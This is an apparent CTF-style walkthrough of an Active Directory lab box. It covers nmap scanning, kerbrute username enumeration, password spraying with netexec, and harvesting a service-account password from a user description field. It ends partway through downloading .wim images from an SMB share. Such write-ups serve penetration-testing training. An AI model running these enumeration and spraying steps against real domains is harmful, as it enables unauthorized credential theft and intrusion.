
Date : 09/06/2026

Target : 10.129.234.42

```bash
>  nmap -sC -sV -Pn -O -p- --min-rate=3000 -T4 10.129.234.42  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 12:12 +0200  
Nmap scan report for shibuya.htb (10.129.234.42)  
Host is up (0.073s latency).  
Not shown: 65516 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-09 10:13:41Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl  
| Not valid before: 2026-06-09T08:37:05  
|_Not valid after:  2027-06-09T08:37:05  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl  
| Not valid before: 2026-06-09T08:37:05  
|_Not valid after:  2027-06-09T08:37:05  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2026-06-09T10:15:15+00:00; -1s from scanner time.  
| rdp-ntlm-info:    
|   Target_Name: SHIBUYA  
|   NetBIOS_Domain_Name: SHIBUYA  
|   NetBIOS_Computer_Name: AWSJPDC0522  
|   DNS_Domain_Name: shibuya.vl  
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl  
|   DNS_Tree_Name: shibuya.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-06-09T10:14:36+00:00  
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl  
| Not valid before: 2026-06-08T08:46:13  
|_Not valid after:  2026-12-08T08:46:13  
9389/tcp  open  mc-nmf        .NET Message Framing  
49664/tcp open  msrpc         Microsoft Windows RPC  
49668/tcp open  msrpc         Microsoft Windows RPC  
60422/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
60630/tcp open  msrpc         Microsoft Windows RPC  
62682/tcp open  msrpc         Microsoft Windows RPC  
62696/tcp open  msrpc         Microsoft Windows RPC  
62715/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
| smb2-time:    
|   date: 2026-06-09T10:14:37  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 168.77 seconds
```

So this is an Active Directory box with : ssh `22/tcp`, DNS `53/tcp` smb 3.1.1 `445/tcp`, LDAP `389/tcp, 3268/tcp`, RPC `135/tcp` and RPC over http `593/tcp` and kerberos `88/tcp`.

`DNS Computer Name : AWSJPDC0522.shibuya.vl` (aws ?) so we'll add that and `shibuya.vl` to our hosts and check `guest` on `smb` :

```bash
>  echo "10.129.234.42 shibuya.htb AWSJPDC0522.shibuya.vl shibuya.vl" | sudo tee -a /etc/hosts
10.129.234.42 shibuya.htb AWSJPDC0522.shibuya.vl shibuya.vl
```

```bash
>  nxc smb shibuya.vl -u guest -p '' --shares  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\guest: STATUS_ACCOUNT_DISABLED
```

Seems like guest won't get us anywhere on smb.

We'll have to enumerate usernames via `kerbrute` :

```bash
>  kerbrute userenum -d shibuya.vl --dc 10.129.234.42 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
  
   __             __               __        
  / /_____  _____/ /_  _______  __/ /____    
 / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                           
  
Version: dev (n/a) - 06/09/26 - Ronnie Flathers @ropnop  
  
2026/06/09 12:57:46 >  Using KDC(s):  
2026/06/09 12:57:46 >   10.129.234.42:88  
  
2026/06/09 12:57:47 >  [+] VALID USERNAME:       purple@shibuya.vl  
2026/06/09 12:57:48 >  [+] VALID USERNAME:       red@shibuya.vl
```

So we got `red` and `purple` as usernames.

```bash
>  nano /tmp/shusers.txt  
>  cat /tmp/shusers.txt  
red  
purple
```

We'll `skew` our `time` to the `DC` just in case :

```bash
>  sudo ntpdate -u 10.129.234.42  
  
9 Jun 13:08:37 ntpdate[96202]: adjust time server 10.129.234.42 offset -0.206735 sec
```

`user:user` is not unusual as a combination, so we'll try spraying both :

```bash
>  printf '%s\n' red purple > /tmp/shusers.txt && cp /tmp/shusers.txt /tmp/shpass.txt  
  
>  nxc smb shibuya.vl -u /tmp/shusers.txt -p /tmp/shpass.txt --no-bruteforce --continue-on-success  
  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\red:red STATUS_LOGON_FAILURE    
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\purple:purple STATUS_LOGON_FAILURE
```

And it failed.

We'll try again with the `-k` argument :

```bash
>  nxc smb shibuya.vl -u /tmp/shusers.txt -p /tmp/shpass.txt -k --continue-on-success  
  
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red    
SMB         shibuya.vl      445    AWSJPDC0522      [-] shibuya.vl\purple:red KDC_ERR_PREAUTH_FAILED    
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\purple:purple
```

And we got both.

```bash
>  nxc smb shibuya.vl -u red -p 'red' -k  --shares  
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red    
SMB         shibuya.vl      445    AWSJPDC0522      [*] Enumerated shares  
SMB         shibuya.vl      445    AWSJPDC0522      Share           Permissions     Remark  
SMB         shibuya.vl      445    AWSJPDC0522      -----           -----------     ------  
SMB         shibuya.vl      445    AWSJPDC0522      ADMIN$                          Remote Admin  
SMB         shibuya.vl      445    AWSJPDC0522      C$                              Default share  
SMB         shibuya.vl      445    AWSJPDC0522      images$                            
SMB         shibuya.vl      445    AWSJPDC0522      IPC$            READ            Remote IPC  
SMB         shibuya.vl      445    AWSJPDC0522      NETLOGON        READ            Logon server share    
SMB         shibuya.vl      445    AWSJPDC0522      SYSVOL          READ            Logon server share    
SMB         shibuya.vl      445    AWSJPDC0522      users           READ
```

We got `READ` permissions on `NETLOGON, SYSVOL & users`.

```bash
>  smbclient //shibuya.vl/users -k -U red%red  
WARNING: The option -k|--kerberos is deprecated!  
gensec_spnego_client_negTokenInit_step: Could not find a suitable mechtype in NEG_TOKEN_INIT
```

So we'll have to use `netexec` to enumerate the list of `users` since we can't connect to the `SMB /users` share directly :

```bash
>  nxc smb shibuya.vl -u red -p 'red' -k --users  
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red    
SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-                                                  
SMB         shibuya.vl      445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain    
SMB         shibuya.vl      445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain    
SMB         shibuya.vl      445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account    
SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV    
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Leigh.Harrison                2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Brian.Elliott                 2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ashleigh.Hancock              2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Kevin.Green                   2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Mathew.Richardson             2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Stanley.Johnson               2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Sophie.Smith                  2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Thomas.Wilson                 2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jacqueline.Taylor             2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Georgia.Smith                 2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Georgia.Kelly                 2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Green                    2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Mohammad.Todd                 2025-02-16 10:23:34 0           
SMB         shibuya.vl      445    AWSJPDC0522      Graham.Francis                2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Elaine.Roberts                2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ross.Allen                    2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Grace.Humphries               2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Roy.Shepherd                  2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Emma.Noble                    2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ryan.Harris                   2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Suzanne.Webb                  2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Edward.Smith                  2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ellie.Chapman                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Bradley.Evans                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Grace.King                    2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Eric.Barnes                   2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Tracey.Holmes                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Joan.White                    2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Leslie.Osborne                2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Frederick.Smith               2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Joseph.Rowe                   2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Melanie.Brown                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jodie.Jenkins                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Bethany.Watson                2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Cameron.Begum                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jenna.Abbott                  2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Karl.Smith                    2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Arthur.Walker                 2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Sheila.Roberts                2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Tom.Barnes                    2025-02-16 10:23:35 0           
SMB         shibuya.vl      445    AWSJPDC0522      Stuart.French                 2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      William.Johnson               2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      David.Poole                   2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Charlene.Walsh                2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jessica.Gordon                2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Francesca.Day                 2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      William.Brown                 2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Sylvia.Doyle                  2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      William.Thomas                2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Craig.Owen                    2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Daly                     2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jacob.Preston                 2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Lynn.Pearson                  2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Antony.Howell                 2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Mary.Grant                    2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Shirley.Matthews              2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Louis.Bond                    2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Norman.Clayton                2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Rhys.Moore                    2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Lynn.Gregory                  2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Abdul.Mason                   2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Diana.Rowe                    2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Olivia.Houghton               2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Katy.Webster                  2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Judith.Black                  2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Henry.Gallagher               2025-02-16 10:23:36 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ryan.Horton                   2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Dylan.Booth                   2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Nathan.Matthews               2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Georgia.Carter                2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Derek.Wade                    2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      David.Cole                    2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Lynn.Harrison                 2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Rachel.Flynn                  2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jade.Smith                    2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Hannah.Taylor                 2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Carole.Barrett                2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Brenda.Peacock                2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Robin.Stevens                 2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Victoria.Jones                2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Victor.Clarke                 2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Joel.Bailey                   2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Stanley.Lowe                  2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Billy.Williams                2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Lorraine.Barber               2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Nicole.Walsh                  2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Mohamed.Daniels               2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Joseph.Woods                  2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Elliott.Hill                  2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Marie.Campbell                2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Cheryl.Patel                  2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Samuel.Curtis                 2025-02-16 10:23:37 0           
SMB         shibuya.vl      445    AWSJPDC0522      Dennis.Little                 2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Rachael.Taylor                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Helen.Walton                  2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Richard.Stokes                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Hilary.Collins                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Christopher.Brookes           2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Max.Day                       2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Marcus.Stevenson              2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Murray                   2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Carly.Franklin                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Luke.Nash                     2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Terry.Saunders                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Callum.Walker                 2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Roger.Mills                   2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Elliott.Page                  2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Barry.Green                   2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jill.Clarke                   2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Vanessa.Harris                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ross.Smith                    2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Jane.Stewart                  2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Gemma.Simpson                 2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Donald.Holmes                 2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Tracy.Ferguson                2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Damien.Dixon                  2025-02-16 10:23:38 0           
SMB         shibuya.vl      445    AWSJPDC0522      Geraldine.Herbert             2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Sarah.Warner                  2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Bryan.Watts                   2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Hayley.Morgan                 2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Glenn.Gough                   2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Sam.Stone                     2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Susan.Baker                   2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Eileen.Anderson               2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Vincent.Bryan                 2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Deborah.Edwards               2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Rosemary.Edwards              2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Dominic.Matthews              2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Sylvia.Farrell                2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Amanda.Wall                   2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Timothy.Freeman               2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Bethan.Davies                 2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Pearce                   2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Stanley.Smart                 2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Susan.Butler                  2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Hannah.Thompson               2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Janice.Connolly               2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Rhys.Marsh                    2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Phillip.Campbell              2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Norman.Evans                  2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Terry.Sharp                   2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Rosie.Williams                2025-02-16 10:23:39 0           
SMB         shibuya.vl      445    AWSJPDC0522      Dominic.Jones                 2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Dorothy.Turner                2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Oliver.Rees                   2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Lewis.Robson                  2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Glenn.Gould                   2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Max.Clark                     2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Oliver.Smith                  2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Ronald.Martin                 2025-02-16 10:23:40 0           
SMB         shibuya.vl      445    AWSJPDC0522      Donald.Dunn                   2025-02-16 10:23:40 0
```

And it goes on until : `[*] Enumerated 503 local users: SHIBUYA`

That's a gigantic number of users.

`svc_autojoin`'s description is `K5&A6Dw9d8jrKWhV`, maybe a `password` we can spray on all the users or try out on the user account itself.

```bash
>  nxc smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' --shares  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV    
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares  
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark  
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------  
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin  
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share  
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ               
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC  
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share    
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share    
SMB         10.129.234.42   445    AWSJPDC0522      users           READ
```

And it works, we can `READ` the `users` directory on `smbclient` directly.

```bash
>  smbclient //shibuya.vl/users -U svc_autojoin  
Password for [WORKGROUP\svc_autojoin]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                  DR        0  Sun Feb 16 11:42:24 2025  
 ..                                DHS        0  Wed Apr  9 02:09:45 2025  
 Administrator                       D        0  Wed Apr  9 01:36:27 2025  
 All Users                       DHSrn        0  Sat May  8 10:34:03 2021  
 Default                           DHR        0  Sat Feb 15 16:49:13 2025  
 Default User                    DHSrn        0  Sat May  8 10:34:03 2021  
 desktop.ini                       AHS      174  Sat May  8 10:18:31 2021  
 nigel.mills                         D        0  Wed Apr  9 01:30:42 2025  
 Public                             DR        0  Sat Feb 15 07:49:31 2025  
 simon.watson                        D        0  Tue Feb 18 20:36:45 2025  
  
               5048575 blocks of size 4096. 1566172 blocks available  
smb: \> cd simon.watson  
smb: \simon.watson\> ls  
NT_STATUS_ACCESS_DENIED listing \simon.watson\*  
smb: \simon.watson\> cd /  
smb: \> cd "All Users"  
cd \All Users\: NT_STATUS_STOPPED_ON_SYMLINK  
smb: \> cd "Default User"  
smb: \Default User\> ls  
NT_STATUS_ACCESS_DENIED listing \Default User\*  
smb: \Default User\> cd /Public  
smb: \Public\> ls  
NT_STATUS_ACCESS_DENIED listing \Public\*  
smb: \Public\> cd /nigel.mills  
smb: \nigel.mills\> ls  
NT_STATUS_ACCESS_DENIED listing \nigel.mills\*  
smb: \nigel.mills\>
```

But we're declined everywhere.

But we also have `READ` on `image$` :

```bash
>  smbclient //shibuya.vl/images$ -U svc_autojoin  
Password for [WORKGROUP\svc_autojoin]:  
Try "help" to get a list of possible commands.   
smb: \> ls  
 .                                   D        0  Sun Feb 16 12:24:08 2025  
 ..                                DHS        0  Wed Apr  9 02:09:45 2025  
 AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 12:23:41 2025  
 AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 12:23:45 2025  
 AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 12:23:47 2025  
 vss-meta.cab                        A   365686  Sun Feb 16 12:22:37 2025  
  
               5048575 blocks of size 4096. 1565772 blocks available
```

We got a bunch of `.wim` files and a `.cab` file.

The `02.wim` and `03.wim` are very large, giving a timeout on the downloads `parallel_read returned NT_STATUS_IO_TIMEOUT` except for `AWSJPWK0222-01.wim` and `vss-meta.cab`.

```bash
smb: \> get AWSJPWK0222-01.wim    
getting file \AWSJPWK0222-01.wim of size 8264070 as AWSJPWK0222-01.wim (779.7 KiloBytes/sec) (average 779.7 KiloBytes/sec)  
smb: \> get vss-meta.cab  
